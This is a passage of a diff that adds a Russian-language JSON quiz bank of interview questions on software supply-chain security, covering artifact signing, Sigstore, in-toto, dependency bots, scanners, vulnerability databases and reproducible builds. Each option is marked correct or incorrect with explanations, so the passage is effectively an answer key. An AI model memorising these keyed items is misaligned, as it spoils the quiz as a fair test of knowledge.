+                "what_actually": "Подпись подтверждает, кто собрал и что не изменено после подписи, но не гарантирует безопасность кода — скомпрометированный pipeline подпишет и вредонос (`SolarWinds`).",
+                "source_of_confusion": "Валидная подпись создаёт ложное чувство «безопасно», хотя она лишь про целостность и источник.",
+                "if_it_were_true": "Тогда `SolarWinds`-malware, подписанный валидным сертификатом, был бы безвреден, но он атаковал тысячи.",
+                "how_it_should_be": "Подпись = доказательство источника и неизменности; чистоту кода проверяют сканеры (Trivy/Snyk), не подпись."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "Достаточно один раз подписать артефакт — проверять подпись при деплое уже не обязательно.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Подпись без верификации бесполезна: безопасность даёт именно enforced-проверка в pipeline (`cosign verify`), а не сам факт наличия подписи.",
+                "source_of_confusion": "Кажется, что главное — поставить подпись, а проверка — формальность, которую можно опустить.",
+                "if_it_were_true": "Тогда атакующий мог бы подменить артефакт неподписанным, и без проверки это прошло бы незамеченным.",
+                "how_it_should_be": "Подпись обязательно сопровождается enforced-верификацией перед деплоем, иначе защита отсутствует."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 10,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Что такое Sigstore и Cosign?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "`Sigstore` — это коммерческий HSM-сервис, который за подписку хранит ваши приватные ключи подписи в облаке.",
+              "correct": false,
+              "sections": {
+                "what_actually": "`Sigstore` — бесплатный публичный сервис keyless-подписи: долгоживущих приватных ключей нет вообще, ключ эфемерный и живёт ~10 минут.",
+                "source_of_confusion": "Управление ключами ассоциируется с HSM/KMS, поэтому Sigstore путают с платным хранилищем ключей.",
+                "if_it_were_true": "Тогда главной фишкой Sigstore не было бы «no long-lived keys», но именно это его суть.",
+                "how_it_should_be": "Sigstore — бесплатный keyless-подход без хранения ключей; identity берётся из OIDC."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "`Sigstore` — проект `Linux Foundation` (2021) для бесплатной keyless-подписи артефактов, поддержан `Google`, `RedHat`, `GitHub`. Компоненты: `Cosign` (CLI для подписи/проверки), `Fulcio` (CA, выдаёт short-lived сертификаты на ~10 минут) и `Rekor` (append-only transparency log). Identity = OIDC (email, GitHub-репо), без long-lived ключей.",
+              "correct": true,
+              "sections": {
+                "explanation": "`Sigstore` убирает главную боль подписи — управление долгоживущими ключами. Разработчик аутентифицируется через OIDC, `Fulcio` выдаёт эфемерный сертификат, `Cosign` подписывает, запись попадает в `Rekor`.",
+                "example": "`cosign sign --yes ghcr.io/myorg/app:1.0` открывает браузер для входа через Google/GitHub, выдаётся сертификат, артефакт подписывается, запись фиксируется в `Rekor`.",
+                "when_to_apply": "`Sigstore`/`Cosign` применяют для подписи контейнеров и артефактов в CI без управления секретными ключами, особенно в GitHub Actions через OIDC-identity.",
+                "edge_cases": "При верификации важно проверять, что identity сертификата совпадает с ожидаемым GitHub workflow path — иначе подпись подтвердит лишь, что подписал кто-то, а не что собрал именно ваш CI.",
+                "related": "[[supply-chain-security-interview#Q9]] зачем подписывать; [[supply-chain-security-interview#Q11]] keyless signing (Fulcio, Rekor); [[supply-chain-security-interview#Q12]] in-toto attestations через cosign."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "`Cosign` — это CA, выдающий сертификаты, а `Fulcio` — CLI для подписи образов.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Роли перепутаны: `Fulcio` — это CA (выдаёт сертификаты), а `Cosign` — CLI для подписи и проверки.",
+                "source_of_confusion": "Оба — компоненты Sigstore с похоже звучащими именами, поэтому их функции меняют местами.",
+                "if_it_were_true": "Тогда команда была бы `fulcio sign image`, но подписывают именно через `cosign sign`.",
+                "how_it_should_be": "`Cosign` = CLI подписи/проверки; `Fulcio` = центр сертификации (CA) с short-lived сертификатами."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "`Sigstore` работает только в закрытой корпоративной сети и требует своего on-premise развёртывания каждым пользователем.",
+              "correct": false,
+              "sections": {
+                "what_actually": "`Sigstore` — это публичный бесплатный сервис (`Fulcio`/`Rekor` доступны всем); on-premise возможен, но не обязателен.",
+                "source_of_confusion": "Security-инфраструктуру привыкли разворачивать локально, поэтому публичность Sigstore упускают.",
+                "if_it_were_true": "Тогда `cosign sign` не работал бы из публичного GitHub Actions без своей CA, но он работает из коробки.",
+                "how_it_should_be": "Sigstore — публичный сервис; подпись доступна сразу, без обязательного собственного развёртывания."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 11,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Что такое keyless signing и роль Fulcio и Rekor?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "`Keyless` означает, что подпись вообще не использует криптографию — артефакт просто помечается именем автора в текстовом файле.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Криптография используется: создаётся эфемерная пара ключей и X.509-сертификат от `Fulcio`; «keyless» — про отсутствие долгоживущего ключа, а не криптографии.",
+                "source_of_confusion": "Слово «keyless» буквально читается как «без ключей вообще», отсюда вывод об отсутствии криптографии.",
+                "if_it_were_true": "Тогда любой мог бы подделать подпись, вписав чужое имя, но эфемерный приватный ключ это исключает.",
+                "how_it_should_be": "Keyless = эфемерные ключи на ~10 минут вместо долгоживущих; криптография полноценная."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "`Rekor` — это центр сертификации, выдающий короткоживущие сертификаты, а `Fulcio` — лог прозрачности.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Роли перепутаны: `Fulcio` — CA (выдаёт сертификаты), `Rekor` — transparency log (append-only записи подписей).",
+                "source_of_confusion": "Оба — бэкенд-компоненты Sigstore, поэтому их функции легко поменять местами.",
+                "if_it_were_true": "Тогда tampering ловил бы `Fulcio`, но immutable-историю подписей ведёт именно `Rekor`.",
+                "how_it_should_be": "`Fulcio` = CA с эфемерными сертификатами; `Rekor` = публичный append-only лог прозрачности."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "`Keyless` — подпись без долгоживущего приватного ключа: ключ существует только ~10 минут. Разработчик аутентифицируется через OIDC, `Fulcio` (CA) проверяет OIDC-токен и выдаёт X.509-сертификат, привязывающий identity к эфемерной паре ключей, `Cosign` подписывает, а сигнатура и запись попадают в `Rekor` (append-only Merkle-лог). Эфемерный ключ уничтожается после подписи.",
+              "correct": true,
+              "sections": {
+                "explanation": "`Fulcio` — публичный CA, привязывающий identity (email/subject) к pubkey с trust anchor Sigstore root. `Rekor` — transparency log по образцу Certificate Transparency: фиксирует каждую подпись и ловит retroactive tampering.",
+                "example": "`cosign sign-blob --yes artifact.tar.gz` без файла ключа: identity берётся из GitHub Actions workflow, `Fulcio` выдаёт короткоживущий сертификат, запись уходит в `Rekor`.",
+                "when_to_apply": "Keyless применяют, когда хотят убрать проблему «где безопасно хранить ключ»: в CI ключ никогда не существует вне эфемерного job.",
+                "edge_cases": "Верификация без приватного ключа опирается на короткую валидность сертификата и запись в `Rekor`: проверяют цепочку до Sigstore root и что подпись сделана в окне валидности сертификата.",
+                "related": "[[supply-chain-security-interview#Q10]] Sigstore и Cosign; [[supply-chain-security-interview#Q9]] зачем подписывать; [[supply-chain-security-interview#Q20]] OIDC для CI как основа identity."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "В keyless-подписи эфемерный приватный ключ хранится в KMS до конца жизни артефакта и используется для повторных проверок.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Эфемерный ключ уничтожается сразу после подписи и не хранится нигде; проверка опирается на сертификат и запись в `Rekor`, а не на сохранённый ключ.",
+                "source_of_confusion": "Привычка к долгоживущим ключам в KMS переносится на keyless-модель.",
+                "if_it_were_true": "Тогда вернулась бы проблема «храни ключ безопасно», которую keyless как раз и решает.",
+                "how_it_should_be": "Ключ живёт только во время подписи и уничтожается; верификация безключевая, через cert + Rekor."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 12,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Что такое in-toto attestations?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "`in-toto attestation` — это unit-тест, который проверяет корректность работы артефакта в рантайме.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Attestation — это подписанное метаданное-утверждение о факте (например «тесты прошли»), а не сам тест и не runtime-проверка.",
+                "source_of_confusion": "Среди типов predicate есть `test`, поэтому attestation путают с самим прогоном тестов.",
+                "if_it_were_true": "Тогда attestation выполнялся бы при каждом запросе к приложению, но это статический подписанный JSON о build-факте.",
+                "how_it_should_be": "Attestation фиксирует и подписывает утверждение о пройденном этапе; сами тесты — отдельный шаг CI."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "`in-toto` — это альтернативный язык программирования для написания CI-pipeline вместо YAML.",
+              "correct": false,
+              "sections": {
+                "what_actually": "`in-toto` — framework подписанных attestations об артефактах, а не язык описания pipeline; pipeline пишут на YAML (GitHub Actions и т.п.).",
+                "source_of_confusion": "Оба относятся к CI/CD, поэтому in-toto принимают за способ описания шагов сборки.",
+                "if_it_were_true": "Тогда workflow-файлы писали бы на in-toto, но они остаются YAML, а in-toto лишь добавляет attestations.",
+                "how_it_should_be": "in-toto описывает подписанные утверждения о результатах этапов, а не сам синтаксис pipeline."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "Наличие in-toto attestation само по себе блокирует деплой скомпрометированного артефакта без какой-либо проверки.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Attestation лишь предоставляет проверяемое утверждение; блокирует деплой admission controller (`Kyverno`/`Gatekeeper`), enforcing политику, а не attestation сам по себе.",
+                "source_of_confusion": "Кажется, что подписанное утверждение автоматически запрещает плохой деплой.",
+                "if_it_were_true": "Тогда хватило бы прикрепить attestation, но без enforcement образ без нужных предикатов всё равно задеплоится.",
+                "how_it_should_be": "Attestation — это вход для политики; защиту даёт обязательная проверка в admission controller."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "`in-toto` — framework, определяющий структурированные подписанные утверждения об артефакте. Attestation — это подписанный JSON с `subject` (имя+digest артефакта), `predicateType` (тип утверждения) и `predicate` (данные). Типы predicate: `slsa-provenance`, `cyclonedx` (SBOM), `vuln` (результат скана), `test` (тесты прошли), `policy`.",
+              "correct": true,
+              "sections": {
+                "explanation": "Attestations превращают каждый этап pipeline в проверяемое подписанное заявление: «код отревьюен», «SLSA provenance», «тесты прошли», «нет critical CVE». На деплое политика проверяет наличие нужных attestations.",
+                "example": "`cosign attest --predicate sbom.json --type cyclonedx image:tag` прикрепляет SBOM-attestation; admission controller (`Kyverno`, `Gatekeeper`) блокирует деплой без требуемых attestations.",
+                "when_to_apply": "in-toto attestations применяют для построения chain of trust: потребитель формирует политику, требующую конкретных predicate от конкретных builders.",
+                "edge_cases": "Сами по себе attestations не защищают: без enforcement в admission controller образ с поддельными или отсутствующими attestations всё равно задеплоится — нужна обязательная проверка политикой.",
+                "related": "[[supply-chain-security-interview#Q18]] provenance; [[supply-chain-security-interview#Q7]] SLSA framework; [[supply-chain-security-interview#Q10]] cosign для подписи и attest."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 13,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Чем отличаются Dependabot и Renovate?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "Оба автоматизируют обновление зависимостей через PR. `Dependabot` нативен в GitHub, бесплатен, настраивается через `.github/dependabot.yml`, делает per-dep PR и берёт advisories из GitHub Advisory Database. `Renovate` (Mend) — open source, self-hosted или cloud, гораздо более конфигурируем (presets, regex, custom managers), гибкие grouping и auto-merge, поддерживает больше менеджеров (`Helm`, `Terraform`, K8s).",
+              "correct": true,
+              "sections": {
+                "explanation": "Главная развилка — простота против гибкости. `Dependabot` — zero-setup для GitHub и небольших репозиториев. `Renovate` — для больших monorepo, многоязычного стека, `GitLab` и тонкой настройки merge-стратегий.",
+                "example": "Для маленького GitHub-репо включают `Dependabot` за минуту; для большого monorepo с `Terraform` и `Helm` берут `Renovate` с auto-merge патчей и группировкой minor-обновлений.",
+                "when_to_apply": "`Dependabot` — дефолт для GitHub и простоты; `Renovate` — когда нужна кастомизация, не-GitHub платформа или поддержка экзотических менеджеров.",
+                "edge_cases": "Оба требуют, чтобы CI проходил перед merge: автообновление без зелёного CI и без security-updates по CVE рискует либо сломать сборку, либо пропустить уязвимость.",
+                "related": "[[supply-chain-security-interview#Q14]] сканеры уязвимостей; [[supply-chain-security-interview#Q15]] CVE vs GHSA как источник advisories; [[supply-chain-security-interview#Q21]] pinned dependencies."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "`Dependabot` и `Renovate` — это сканеры контейнерных образов на уязвимости, аналоги `Trivy`.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Оба автоматизируют обновление зависимостей через PR в репозиторий, а сканированием образов на CVE занимается `Trivy`/`Grype`/`Snyk`.",
+                "source_of_confusion": "И те, и другие связаны с уязвимостями зависимостей, поэтому их роли смешивают.",
+                "if_it_were_true": "Тогда `Dependabot` сканировал бы Docker-образ в registry, но он работает с манифестами зависимостей в репо.",
+                "how_it_should_be": "Dependabot/Renovate обновляют зависимости PR-ами; сканирование образов — это Trivy/Grype/Snyk."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "`Renovate` — это проприетарный сервис только для GitHub, а `Dependabot` — open source для любых платформ.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Наоборот: `Dependabot` нативен именно в GitHub, а `Renovate` open source и работает в т.ч. на `GitLab`, self-hosted и cloud.",
+                "source_of_confusion": "Обе — боты обновлений, поэтому их платформенную привязку и лицензию путают.",
+                "if_it_were_true": "Тогда `Renovate` нельзя было бы использовать в `GitLab`, но именно там он популярен.",
+                "how_it_should_be": "`Dependabot` = GitHub-нативный; `Renovate` = open source, мультиплатформенный, гибко настраиваемый."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "`Dependabot` поддерживает кастомные regex-менеджеры и `Terraform`/`Helm`, а `Renovate` ограничен только npm.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Кастомные regex-менеджеры и широкая поддержка (`Helm`, `Terraform`, K8s) — это сильная сторона `Renovate`, а не `Dependabot`.",
+                "source_of_confusion": "Возможности двух инструментов приписывают не тому из них.",
+                "if_it_were_true": "Тогда `Renovate` не выбирали бы за гибкость и широту экосистем, но именно за это его и берут.",
+                "how_it_should_be": "Богатая кастомизация и широкий охват менеджеров — у `Renovate`; `Dependabot` проще и уже по охвату."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 14,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Чем отличаются сканеры Trivy, Snyk и Grype?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "`Trivy`, `Snyk` и `Grype` — все три коммерческие и требуют платной подписки для любого использования.",
+              "correct": false,
+              "sections": {
+                "what_actually": "`Trivy` и `Grype` бесплатны и open source; коммерческий только `Snyk` (с ограниченным free tier).",
+                "source_of_confusion": "Раз это enterprise-security-инструменты, кажется, что все они платные.",
+                "if_it_were_true": "Тогда `Trivy` не был бы де-факто open source лидером в CI, но именно за бесплатность его и берут.",
+                "how_it_should_be": "`Trivy`/`Grype` = бесплатные open source; `Snyk` = коммерческий с ограниченным free tier."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "`Trivy` (`Aqua Security`) — бесплатный open source, сканирует образы, файловые системы, git-репо, K8s, SBOM, IaC, секреты; де-факто лидер open source. `Snyk` — коммерческий (free tier ограничен), включает `SAST`, богатые fix-предложения с auto-PR и проприетарную БД уязвимостей. `Grype` (`Anchore`) — бесплатный, фокус на vuln-сканировании SBOM/образов, в паре с `Syft`.",
+              "correct": true,
+              "sections": {
+                "explanation": "Выбор по нише: `Trivy` широк и бесплатен (IaC, секреты, SBOM), `Snyk` силён в IDE/PR-интеграциях и fix-подсказках, `Grype` прост и быстр для сканирования SBOM, генерируемого `Syft`.",
+                "example": "Типовой стек: dev — `Snyk` (IDE-интеграция) или `Trivy`; CI — `Trivy` (бесплатно, быстро); runtime — `Falco` + `Kubescape`; `Grype` сканирует SBOM от `Syft`.",
+                "when_to_apply": "`Trivy` берут для CI и широкого охвата без бюджета, `Snyk` — где нужны fix-подсказки и глубокие интеграции, `Grype` — когда уже есть SBOM от `Syft`.",
+                "edge_cases": "У всех есть false positives; `VEX` (в `CycloneDX`) позволяет пометить уязвимость как «not exploitable», иначе команда тонет в нерелевантных алертах.",
+                "related": "[[supply-chain-security-interview#Q15]] CVE vs GHSA как источники данных; [[supply-chain-security-interview#Q6]] генерация SBOM для Grype; [[supply-chain-security-interview#Q13]] Dependabot/Renovate как смежный инструмент."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "`Grype` генерирует SBOM сам и не нуждается ни в каких внешних инструментах.",
+              "correct": false,
+              "sections": {
+                "what_actually": "`Grype` сфокусирован на сканировании уязвимостей и в паре с `Syft` для генерации SBOM; сам он SBOM не генерирует.",
+                "source_of_confusion": "`Grype` и `Syft` — от одного вендора `Anchore`, поэтому их функции объединяют в один инструмент.",
+                "if_it_were_true": "Тогда `Syft` был бы не нужен рядом с `Grype`, но именно `Syft` отвечает за генерацию SBOM.",
+                "how_it_should_be": "`Grype` сканирует уязвимости; SBOM для него генерирует `Syft` (разделение ролей)."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "`Snyk` — это только сканер контейнерных образов и не умеет анализировать исходный код (SAST).",
+              "correct": false,
+              "sections": {
+                "what_actually": "`Snyk` как раз включает `SAST` для исходного кода, а также сканирование зависимостей, контейнеров и IaC.",
+                "source_of_confusion": "Многие сканеры ограничены образами, поэтому `Snyk` сужают до той же ниши.",
+                "if_it_were_true": "Тогда у `Snyk` не было бы богатых fix-подсказок для кода, но это его сильная сторона.",
+                "how_it_should_be": "`Snyk` широк: SAST по коду, зависимости, контейнеры, IaC — не только образы."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 15,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Чем отличаются базы CVE и GHSA (и при чём тут OSV)?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "`CVE` поддерживается GitHub, а `GHSA` — это глобальный канонический идентификатор от `MITRE`.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Роли перепутаны: `CVE` — это канонический ID от `MITRE`/NVD, а `GHSA` — БД advisories именно от GitHub.",
+                "source_of_confusion": "Обе — базы уязвимостей с похожей ролью, поэтому их владельцев меняют местами.",
+                "if_it_were_true": "Тогда `CVE-2021-44228` был бы GitHub-идентификатором, но префикс `CVE` принадлежит MITRE.",
+                "how_it_should_be": "`CVE` = MITRE/NVD (глобальный ID); `GHSA` = GitHub Security Advisories."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "`GHSA` всегда медленнее `CVE`, потому что обязан дождаться присвоения CVE-номера перед публикацией.",
+              "correct": false,
+              "sections": {
+                "what_actually": "`GHSA` часто публикуется БЫСТРЕЕ: мейнтейнеры выкладывают advisory до присвоения CVE, а маппинг на CVE появляется позже.",
+                "source_of_confusion": "Кажется, что глобальный `CVE` всегда первичен и предшествует любым другим БД.",
+                "if_it_were_true": "Тогда GHSA не имел бы преимущества по скорости, но именно оперативность — его плюс.",
+                "how_it_should_be": "GHSA нередко опережает CVE; CVE присваивается с лагом и подтягивается к GHSA позже."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "`CVE` (Common Vulnerabilities and Exposures) — глобальный канонический идентификатор от `MITRE` (`CVE-2021-44228`), анализируется и скорится в `NVD` (NIST); между раскрытием и присвоением CVE есть лаг в дни/недели. `GHSA` (GitHub Security Advisories) — БД GitHub (`GHSA-xxxx-...`), часто быстрее (мейнтейнеры публикуют до CVE), с богатыми метаданными. `OSV` (Google) — унифицированный формат, агрегирующий `GHSA`, `PyPI`, `npm`, `RustSec`.",
+              "correct": true,
+              "sections": {
+                "explanation": "`CVE` — единый глобальный ID, но медленный; `GHSA` оперативнее и детальнее, мапится на CVE при присвоении. `OSV` сводит источники в machine-readable JSON с API `osv.dev`.",
+                "example": "`Dependabot` тянет из `GHSA`, `Trivy` — из `NVD` + `GHSA` + `OSV` + language-specific; одна уязвимость может иметь и `GHSA`, и `CVE`, и vendor advisory, и тулы дедуплицируют.",
+                "when_to_apply": "Понимание источников нужно при выборе сканера и оценке покрытия: для GitHub-экосистемы быстрее `GHSA`, для глобальной канонизации — `CVE`/`NVD`.",
+                "edge_cases": "`CVSS`-score (0-10) считается `NVD`/вендором, но часто не отражает эксплуатируемость в вашем контексте — `VEX` помогает отметить нерелевантные; `CVSS 4.0` (2023) внедряется медленно, доминирует 3.1.",
+                "related": "[[supply-chain-security-interview#Q14]] сканеры, использующие эти БД; [[supply-chain-security-interview#Q2]] CVE-2021-44228 (log4shell); [[supply-chain-security-interview#Q4]] SBOM для сопоставления компонентов с CVE."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "`OSV` — это собственный сканер уязвимостей от Google, конкурирующий с `Trivy` и `Snyk`.",
+              "correct": false,
+              "sections": {
+                "what_actually": "`OSV` — это унифицированный формат и агрегатор БД (GHSA, PyPI, npm, RustSec) с API `osv.dev`, а не сканер.",
+                "source_of_confusion": "`OSV` связан с уязвимостями и от Google, поэтому его принимают за инструмент сканирования.",
+                "if_it_were_true": "Тогда `Trivy` не использовал бы `OSV` как источник данных, но он именно потребляет OSV.",
+                "how_it_should_be": "`OSV` — это формат/агрегатор данных об уязвимостях; сканеры (Trivy/Snyk) его потребляют."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 16,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Что такое reproducible builds (воспроизводимые сборки)?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "`Reproducible build` означает, что сборка проходит быстро благодаря кешированию промежуточных артефактов.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Reproducible build — про побайтовую идентичность результата при пересборке, а не про скорость; кеширование — это про производительность.",
+                "source_of_confusion": "И reproducibility, и кеширование требуют детерминизма входов, поэтому цели смешивают.",
+                "if_it_were_true": "Тогда метрикой была бы длительность сборки, но критерий — совпадение хешей бинарей.",
+                "how_it_should_be": "Reproducible build = одинаковые байты результата; скорость и кеш — отдельная цель (ближе к hermetic)."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "`Reproducible build` гарантирует, что в исходном коде нет вредоносных закладок.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Воспроизводимость подтверждает лишь, что бинарь соответствует исходнику; вредоносный исходник соберётся воспроизводимо и пройдёт проверку.",
+                "source_of_confusion": "Кажется, что раз сборку можно проверить, то и код автоматически чист.",
+                "if_it_were_true": "Тогда `xz`-бэкдор не прошёл бы reproducible-проверку, но он был в исходнике, а не в сборке.",
+                "how_it_should_be": "Reproducibility проверяет соответствие бинаря исходнику; чистоту кода обеспечивают review и аудит."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "Главный источник недетерминизма устраняется простым удалением всех unit-тестов из сборки.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Недетерминизм идёт от timestamps, UUID, путей, locale и порядка компиляции; тесты тут ни при чём, их удаление ничего не чинит.",
+                "source_of_confusion": "Тесты иногда «флакают», поэтому их ошибочно винят в невоспроизводимости бинаря.",
+                "if_it_were_true": "Тогда проекты без тестов были бы автоматически воспроизводимыми, но это не так.",
+                "how_it_should_be": "Чинят недетерминизм через `SOURCE_DATE_EPOCH`, стабильную сортировку, stripped paths и pinned compiler."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "`Reproducible build` — когда из одного и того же исходника получается побайтово идентичный бинарь независимо от того, когда, где и кем он собран. Это позволяет любому пересобрать и сравнить хеш, доверяя опубликованному бинарю, и ловит tampering в стиле `SolarWinds`. Был компонентом (убранного) `SLSA Level 4`.",
+              "correct": true,
+              "sections": {
+                "explanation": "Главные источники недетерминизма: встроенные timestamps, случайные UUID, пути сборки, порядок параллельной компиляции, locale/timezone, разные версии компилятора. Фиксы — `SOURCE_DATE_EPOCH`, стабильная сортировка, stripped paths, pinned compiler.",
+                "example": "`Bitcoin Core` и `Tor` собираются воспроизводимо: несколько разработчиков независимо пересобирают и сравнивают хеши; `diffoscope` помогает глубоко продиффить два бинаря.",
+                "when_to_apply": "Reproducible builds внедряют для критичных артефактов, где нужна независимая верификация публикуемого бинаря и защита от подмены на build-стадии.",
+                "edge_cases": "Воспроизводимость не покрывает сам исходник: код может быть вредоносным и при этом собираться воспроизводимо — `xz`-бэкдор прошёл бы такую проверку, ведь проблема была в источнике, а не в сборке.",
+                "related": "[[supply-chain-security-interview#Q17]] hermetic builds; [[supply-chain-security-interview#Q2]] SolarWinds как мотивация; [[supply-chain-security-interview#Q8]] SLSA L4 и его требования."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 17,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Что такое hermetic builds (Bazel, Nix) и чем они отличаются от reproducible?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "`Hermetic build` — сборка читает ТОЛЬКО объявленные входы (исходник + явно перечисленные зависимости): нет сети, нет системного состояния, нет неявных зависимостей. Отличие от reproducible: reproducible — про одинаковые байты на выходе, hermetic — про полностью объявленные входы. Hermeticity помогает достичь reproducibility. Инструменты — `Bazel` (sandboxed builds), `Nix` (чистые функции drv).",
+              "correct": true,
+              "sections": {
+                "explanation": "Hermeticity убирает «works on my machine»: системные библиотеки не протекают внутрь. Это даёт корректность кеша (неизменные входы → валидный кеш) и безопасность — без сети в сборке нельзя подтянуть вредоносную зависимость на build-time. Требуется для `SLSA L3+`.",
+                "example": "`Bazel` собирает в sandbox (workers в chroot/контейнерах) с зависимостями, объявленными в `BUILD`-файлах; `Nix` запускает `nix build` в sandbox с криптографическими хешами входов.",
+                "when_to_apply": "Hermetic builds внедряют для критичных сервисов и больших monorepo (Google, Meta), где нужны корректность кеша 90%+ и защита от build-time подмены.",
+                "edge_cases": "Ретрофит существующего `Makefile`-проекта в hermetic — большой труд; для маленького репо это overkill, ROI оправдан в огромных monorepo с высоким cache hit rate.",
+                "related": "[[supply-chain-security-interview#Q16]] reproducible builds; [[supply-chain-security-interview#Q8]] SLSA L3 требует hermeticity; [[supply-chain-security-interview#Q21]] pinned dependencies как объявление входов."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "`Hermetic build` означает, что сборка обязательно скачивает свежие версии зависимостей из интернета на каждом запуске.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Наоборот: hermetic build НЕ ходит в сеть и читает только заранее объявленные входы; запрет сети — ключевое свойство.",
+                "source_of_confusion": "«Свежие зависимости» ассоциируются с актуальностью, поэтому сетевой доступ кажется плюсом.",
+                "if_it_were_true": "Тогда на build-time можно было бы подтянуть вредоносную зависимость, но именно это hermeticity и исключает.",
+                "how_it_should_be": "Hermetic build изолирован от сети и системы; все входы объявлены явно и зафиксированы."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "`Hermetic` и `reproducible` — это полные синонимы, обозначающие одно и то же свойство сборки.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Это разные свойства: reproducible — одинаковые байты на выходе, hermetic — полностью объявленные входы; hermeticity помогает reproducibility, но не равна ей.",
+                "source_of_confusion": "Оба термина про детерминизм сборки, поэтому их считают взаимозаменяемыми.",
+                "if_it_were_true": "Тогда reproducible был бы невозможен без hermeticity, но воспроизводимость достижима и без полной герметичности.",
+                "how_it_should_be": "Reproducible — про выход (байты), hermetic — про входы (объявленность); это связанные, но разные свойства."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "`Nix` и `Bazel` — это менеджеры зависимостей вроде npm, которые просто скачивают пакеты из реестра.",
+              "correct": false,
+              "sections": {
+                "what_actually": "`Bazel` — sandboxed build-система, `Nix` — функциональный пакетный менеджер/билд-система с детерминированными sandbox-сборками; это не обычные загрузчики пакетов.",
+                "source_of_confusion": "Они работают с зависимостями, поэтому их сводят к привычным менеджерам пакетов.",
+                "if_it_were_true": "Тогда они не обеспечивали бы изоляцию и hermeticity, но именно это их суть.",
+                "how_it_should_be": "`Bazel`/`Nix` — это hermetic build-системы с sandbox и объявленными входами, а не простые загрузчики пакетов."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 18,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Что такое provenance (кто что собрал) и как её проверяют?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "`Provenance` — это лог уровня приложения, фиксирующий действия пользователей в продакшене.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Provenance — это build-time метаданные о происхождении артефакта (коммит, builder, окружение), а не runtime audit-лог действий юзеров.",
+                "source_of_confusion": "И provenance, и audit-логи фиксируют «кто что сделал», поэтому их путают.",
+                "if_it_were_true": "Тогда provenance менялась бы при каждом запросе, но это статические метаданные, привязанные к сборке.",
+                "how_it_should_be": "Provenance описывает происхождение артефакта на build-time; действия пользователей пишут в audit-логи."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
